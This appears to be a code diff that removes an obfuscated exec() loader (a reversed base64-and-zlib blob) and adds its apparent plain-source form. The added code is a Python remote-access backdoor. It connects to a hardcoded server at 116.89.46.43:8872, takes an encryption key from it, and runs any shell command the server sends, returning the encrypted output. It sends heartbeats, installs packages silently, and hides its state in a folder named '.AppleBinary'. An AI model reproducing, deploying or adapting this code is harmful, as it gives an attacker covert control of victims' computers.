@@ -1,1 +1,121 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'HEdLP/y9M9OdNZLJUHnhYfD2g7m6ltmhXPwOSBOczt3wTtmV/eLtuZiXZrUTbw0zKy3s1uTXrEAxSKWjqG2zDFOY6uAV4338Pbr9Yle0jimbMPrRBa4VIx+KLg/Q/kgLWKzzALcrUN+G4bjUHzEJuRZg9V3B16m2B/4ydMJ8l7wbIGjsdZ26QbvXXz1l21Qff7G209QrGrvPvdH5beL22e/MUvU88j2szFgyt4bDYNPA71X/eDxZZ0HAvL9j+WHln1u0HU1nJQP2Aujh9OMWRytXV0vFXO4jhNpxPpBfuT3aCaZoH1svp6+rMfymPi41H4HyPjef8dhg+2YZNkA8l/Xl6XUhLdekGkKqookV4OHHyEZw+6A74oO589W2Km9kN1IdPBDQAFssAkA+3P064WXzC9EhOE/7+6/uvtj4t/xx8qtm2XpbltnQMsuOWJzOg21HfL2OPcy96XLkndC2tE2omABhGGmsVTTrXPCmMShd+aspcTLM0nXid5JqSuou/NqrnRTSEFNqS5j4tFbhI/oSML1HHl5D8/OeP1eWeTGGVNqXzP/onexljcW3xuw0n5GHc8nY24aOTPYURhsVbO36m5aOHXI04BeribpxgSbzquh+7u3DDubf0P7kf4ai/I3yB7Jth9mliGmBziV92lVGr7jtygDNywO77MzJ8x6P5jxRbYx0IBGIcw5HzLhwXSJcFerRAvViyvcSDu3NjpdhmWVDqGHxeu/W6YfPVawiKrGzSiLxF/zpvH2JEmhW0zqK1N7pt3oJ9IAz7wx2AtAlLr7UWLOSUUkVG2bGSDPVBPKUa7W7MQ6muQuUYitgyTjo71E7Zo4Tly1uXWKatpYKoPZKBtFn4WzMTE9uBpTDZbY0GeWGBb2MerSWhC1JYvskVIzWxFITUkyQcME5jCi2aX0GENOB/JtisAuLEvnEIZD5qIBwtaHv2IrCjrJoirMx3gRqDg4v+yZk8Lcq23+FGAGOTOJD7ywYj/YxAmJMEeTMOvgmhtFf37x/eor/N5dm+5zP7KNdSqn95rvZ4/d7i8vUYYrsAsKYpte+5B3ZpDswP/MS/2TI5rXRRPKhZkAMYchTqUDLNMaMaoqwbVvbLqw0UahBWIAduwgAsVL4TSy7gjrBFWlQxlvsb/rgUrc5U2gPU8MKeEC6U3koKZymDtGjERZWkn8IuzUeB7BgVPggid/aBWKHnD8LufjB0FdxER7qWTlUiSTlrO5pAAgAu2qREw9Y9LbnWESeFVEeVnLxpK48WQg6qhUCzMj4faTsCJ/WJSZQ6qjdFArweTUh/IZayRTsTdOzrhsx9ekIUl5yGTbLEbdnXxoFQ2aTLHt6qSYwsiea8ZMfllfglqXAiRFoamj8tEAlpsAZRhE/JmvIbfh5vrF/j7Yygs//iOYbpAik4UrtbSBCvO0L1Y46OwxCdl9DAflr9S71fejlPkXwfdvfMYz4v9tVlyJe'))
+import socket
+from sys import executable,argv
+from threading import Thread
+from subprocess import check_output,Popen
+from time import sleep, time
+from os import _exit, path, mkdir, execl
+from random import randint
+try:
+    from cryptography.fernet import Fernet
+except Exception as e:
+    Popen(['pip3','install','cryptography'])
+    Popen(['brew','install','python-cryptography'])#Target non-pip python systems, brew managed systems
+    from cryptography.fernet import Fernet
+
+global username
+    
+ip = "116.89.46.43"
+# ip = 'localhost'
+port = 8872
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    sock.connect((ip, port))
+except Exception as e:
+    _exit(0)
+item = sock.recv(256)
+print(item)
+gkey = Fernet(item)
+
+def genuser():
+    username=''.join(str(randint(1,9)) for _ in range(8))
+    return username
+
+def initialiser(username):
+    with open(userfp,'w') as f:
+        f.write(username)
+    sock.send(gkey.encrypt(f"initstats tg {username}".encode()))
+    a = sock.recv(256)
+    rsp = gkey.decrypt(a).decode()
+    if rsp != "0":
+        Thread(target=handler,args=(username,)).start()
+        Thread(target=hb,args=(username,)).start()
+        return 0
+    else:
+        sock.send(gkey.encrypt(f"dinit tg {username}".encode()))
+        rsp = gkey.decrypt(sock.recv(256)).decode()
+        if rsp == "0":
+            Thread(target=handler,args=(username,)).start()
+            Thread(target=hb,args=(username,)).start()
+            return 0
+        else:
+            _exit(0)
+            
+
+def hb(u):
+    while True:
+        sock.send(gkey.encrypt(f"hb {u}".encode()))
+        sleep(3.5)
+
+
+#DATAT(ci) tg(role) USERNAME(username) ABCDEFG(content) vkey(this is the vkey)
+
+def handler(username):
+    last_data = None
+    while True:
+        vkeyb = Fernet.generate_key()
+        vkey = Fernet(vkeyb)
+        edata = sock.recv(262144)
+        data = gkey.decrypt(edata).decode()
+        # print(f"Last data: {last_data}")
+        # print(data)
+        if last_data != edata:
+            if data not in ['reset','kill','DS','hb:ok']:
+                last_data = data
+                tokens = data.split(" ",1)
+                ci = tokens[0]
+                print(data)
+                if ci == "exec":
+                    ec = tokens[1]
+                    #replace further with interactive shell session, use check_output for now
+                    try:
+                        print("works")
+                        output = check_output(ec,shell=True)
+                    except Exception as e:
+                        print(e)
+                        output = f"An Error has occured.\n\n Details: {e}]".encode()
+                    eoutput = vkey.encrypt(output).decode()
+                    response = f"DATAT tg {username} {eoutput} {vkeyb.decode()}"
+                elif ci == "bg":
+                    Popen(tokens[1],shell=True)
+                elif data == "SYN":
+                    print(data)
+                    response = f"DATAT tg {username} {vkey.encrypt(b'ACK').decode()} {vkeyb.decode()}"
+                else:
+                    response = f"DATAT tg {username} {vkey.encrypt(b'1').decode()} {vkeyb.decode()}"
+                    
+                #continue with the control system
+                sock.send(gkey.encrypt(response.encode()))
+
+            elif data == "reset":
+                execl(executable, executable, *argv)
+            elif data == "kill":
+                _exit(0)
+                
+
+
+
+
+
+#make required files
+fp = ".AppleBinary"
+userfp = fp + "/id.conf"
+setu=False
+
+username = check_output(["whoami"]).decode().strip()
+if not path.exists(fp):
+    mkdir(fp)
+if path.exists(userfp):
+    with open(userfp,'r') as f:
+        username = f.read().splitlines()[0]
+
+initialiser(username)
